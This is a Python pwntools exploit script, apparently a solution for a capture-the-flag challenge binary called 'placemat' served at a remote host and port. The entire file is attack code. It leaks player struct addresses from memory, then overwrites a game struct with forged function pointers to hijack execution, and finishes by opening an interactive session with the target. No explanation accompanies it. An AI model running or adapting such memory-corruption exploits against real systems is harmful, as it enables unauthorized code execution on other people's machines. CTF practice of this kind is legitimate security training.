# type: ignore
from pwn import *

context.terminal = ['tmux', 'new-window']

def menu_idx(idx):
    p.recvuntil("3 Exit\n")
    p.sendline(str(idx))

def play_game(borh, name, name2 = b''):
    p.sendlineafter("? ", borh)
    
    p.sendlineafter("?\n", name)
    if borh == b'h':
        p.sendlineafter("?\n", name2)

# p = process("./placemat")
p = remote("flu.xxx", "11701")
# gdb.attach(p, gdbscript='''
# b *0x0804AB28
# ''')

menu_idx(1)

# play_game(b'b', b'A'*0x10)
play_game(b'h', b'A'*0x10, b'A'*0x1c)

p.recvuntil("A"*0x14)
p.recv(4)
player_2_struct_addr = u32(p.recv(4))
player_1_struct_addr = player_2_struct_addr - 0x18

for i in range(1, 3):
    p.sendlineafter(": ", f"A{i}")
    p.sendlineafter(": ", f"B{i}")
p.sendlineafter(": ", f"A{3}")

struct_of_bot = p32(0x0804a71a) + p32(0x0804a73c) + p32(0x08049a02) + p32(0x0804AF4E) + p32(0x00000000) + p32(0x0804c1e8)

g = cyclic_gen()
menu_idx(1)
single_human_addr = player_1_struct_addr
single_bot_addr = player_2_struct_addr
print(hex(single_human_addr), hex(single_bot_addr))
play_game(b'b', struct_of_bot[4:] + p32(single_bot_addr+0x104) + p32(0x0804C1D4)*0x40 + struct_of_bot)

p.sendlineafter(": ", f"C{1}")
for i in range(1, 3):
    p.sendlineafter(": ", f"A{i}")
    p.sendlineafter(": ", f"B{i}")
p.sendlineafter(": ", f"A{3}")

p.interactive()